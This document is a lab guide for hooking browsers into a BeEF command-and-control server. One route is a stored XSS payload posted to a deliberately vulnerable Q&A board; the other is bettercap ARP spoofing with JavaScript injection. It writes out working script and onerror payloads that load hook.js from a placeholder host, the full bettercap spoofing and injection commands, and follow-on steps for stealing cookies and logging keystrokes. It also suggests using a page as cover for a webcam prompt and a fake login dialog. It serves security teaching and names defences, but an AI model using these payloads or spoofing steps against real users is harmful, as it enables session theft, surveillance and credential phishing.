# Lab Setup — myNorthgate + BeEF + Bettercap

Two things that are often confused:

| Piece | What it does |
|---|---|
| **BeEF** | Command-and-control server for hooked browsers. Doesn't inject anything on its own. |
| **Hook delivery** | Whatever actually lands `hook.js` in the target browser. BeEF assumes you already solved this part. |

This lab demonstrates **two different ways** to deliver the hook into a
browser so it shows up in BeEF:

1. **Stored XSS on a vulnerable app** — a crafted post on the Q&A board
   of this project runs `<script src=".../hook.js">` for every viewer.
   The fault lies with the *site*.
2. **Network MITM with bettercap** — on a compromised network segment
   (rogue hotspot, ARP-spoofed LAN), plain-HTTP traffic is rewritten in
   transit to add the hook to *any* page the target loads. The fault
   lies with the *network path*.

Both end in the same place: a hooked browser in BeEF's panel.

**Authorized lab only.** Your own machines/VMs, your own isolated
network, or consented test users.

---

## Shared setup · Run BeEF (C2 server)

On your BeEF host (substitute `YOUR_BEEF_HOST` in the examples below
with that machine's address):

```bash
sudo apt install beef-xss && sudo beef-xss
# or
git clone https://github.com/beefproject/beef && cd beef && ./install && ./beef
```

Starts and prints:
- **Hook URL:** `http://YOUR_BEEF_HOST:3000/hook.js`
- **Panel URL:** `http://YOUR_BEEF_HOST:3000/ui/panel`

Leave BeEF running for both demos.

---

## Vector 1 · Stored XSS → BeEF (app-layer)

### 1.1 Serve the portal

From the project folder, on any machine the target browser can reach:

```bash
python -m http.server 8000
```

Open `http://<server>:8000` in the test browser. Must be `localhost` /
`127.0.0.1` / `file://` for the Q&A board's unescaped rendering to kick
in; on any other hostname the board escapes posts and no payload will
execute (see "Lab-mode gating" in Gotchas below).

### 1.2 Inject via a posted question

1. In the portal, scroll to the **Student Q&A Board**.
2. In the **Ask a question** form, submit a title or body containing a
   payload, for example:

   ```html
   <script src="http://YOUR_BEEF_HOST:3000/hook.js"></script>
   ```

   or an event-handler payload like:

   ```html
   <img src=x onerror="var s=document.createElement('script');s.src='http://YOUR_BEEF_HOST:3000/hook.js';document.body.appendChild(s)">
   ```

3. The payload becomes a question on the board. **Any browser that
   loads the board** now runs the script → appears under **Online
   Browsers** in the BeEF panel.

Why it's a real demo and not a trick: the page's render path is doing
exactly what a *vulnerable* backend would do — concatenating user
content into HTML without escaping. The real-world fix is to escape
before rendering (what this project's public GitHub Pages build does)
or to use `textContent` instead of `innerHTML`.

---

## Vector 2 · Bettercap MITM → BeEF (network-layer)

This demo does **not** need the myNorthgate portal at all — the point
is that on a compromised network, bettercap can inject the hook into
*any* plain-HTTP page the target loads, including real-looking sites.
The target site doesn't have to be vulnerable; the network path is.

### 2.1 Position

- Attacker machine, victim machine, and the gateway are all on the
  same **isolated lab network** (separate VLAN, lab Wi-Fi, or a VM-only
  network). Do not run this on a network you don't own.
- Attacker runs Linux (Kali is common) with bettercap installed:

  ```bash
  sudo apt install bettercap
  ```

### 2.2 Start bettercap and open the interactive prompt

```bash
sudo bettercap -iface eth0        # use your lab interface name
```

### 2.3 Gain the MITM position + inject the hook

At the bettercap prompt (`> `):

```
# redirect the victim's traffic through us
set arp.spoof.internal true
set arp.spoof.targets 192.168.56.0/24      # your lab subnet or specific IPs
arp.spoof on

# inject the BeEF hook into every HTTP response
set http.proxy.injectjs http://YOUR_BEEF_HOST:3000/hook.js
http.proxy on
```

Now, whenever the victim browser loads **any plain-HTTP page**, bettercap
rewrites the response on its way through, adding the `<script>` tag that
loads `hook.js`. The browser parses the HTML and runs the script just as
if the site itself had included it. The browser appears in BeEF under
**Online Browsers**, same as the stored-XSS vector.

### 2.4 Stop

At the prompt:

```
http.proxy off
arp.spoof off
quit
```

### 2.5 What this demo proves

- An app being "secure" (no XSS, no bugs) is **not enough** to protect a
  user whose network path has been tampered with.
- Plain **HTTP** is the attack surface. Downgrading HTTPS → HTTP is
  blocked by HSTS on most real sites, so the demo works best on sites
  (or VMs) that still serve plain HTTP.
- The one real defence against this vector is end-to-end **TLS with
  HSTS**, not anything the app itself can do.

---

## What to do once the browser is hooked (either vector)

In the BeEF panel, select the hooked browser → **Commands** → choose a
module. Starting points:

- *Browser → Hooked Domain → Get Cookie*
- *Browser → Webcam* (the `booth.html` page is natural cover for the
  camera prompt)
- *Social Engineering → Pretty Theft* (fake login dialog; the myPortal
  sign-in panel reinforces it if the hook came from the portal)
- **Logs** tab — shows typing captured on the hooked page.

---

## Gotchas

- **BeEF must be reachable** from the target browser (same network, no
  firewall on port 3000). If BeEF is down the payload still gets stored
  (or injected), but the `<script src>` fetch will 404 / time out and
  no hook lands.
- **CSP / CORS** aren't configured in this lab app, so the stored
  script "just works." A real site that sets a strict
  `Content-Security-Policy` would block an external `<script src>` even
  if an XSS existed. Bettercap's injection is similarly thwarted if the
  site is HTTPS with HSTS.
- **Lab-mode gating** (`portal.js`) requires the host to be `localhost`,
  `127.0.0.1`, `file://` or a `*.localhost` / `*.local` address. On
  GitHub Pages or any other public hostname the board escapes
  everything and the stored-XSS vector is inert.
- **Bettercap scope**: ARP spoofing an unauthorized network is illegal
  in most jurisdictions. Only run it on networks you own or on an
  isolated lab segment set up for the class.
- **HTTPS / HSTS** sites are **not** affected by `http.proxy.injectjs`
  because the response body is encrypted end-to-end. This is the
  intended real-world defence, and the demo should acknowledge it.
- **Scope**: this is for an isolated lab. Don't point either vector at
  browsers whose owners haven't consented.
